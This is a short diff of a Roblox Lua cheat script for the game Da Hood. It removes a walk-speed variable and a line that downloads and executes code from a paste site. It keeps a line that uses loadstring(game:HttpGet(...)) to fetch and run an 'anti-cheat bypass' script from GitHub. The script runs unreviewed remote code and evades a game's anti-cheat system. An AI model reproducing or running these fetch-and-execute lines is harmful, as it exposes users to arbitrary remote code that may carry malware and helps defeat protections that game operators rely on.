@@ -7,9 +7,6 @@ local Antilocking = false
 local Animate = game.Players.LocalPlayer.Character.Animate
 local Idle1 = Animate.idle.Animation1.AnimationId
 local Idle2 = Animate.idle.Animation2.AnimationId
-local Walkspeed = 0.0122
-
-loadstring(game:HttpGet("https://www.klgrth.io/paste/85rzj/raw"))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/zfnxx/Da-Hood-Anti-Cheat-Bypass/main/anti-cheat-bypass.lua"))()
 
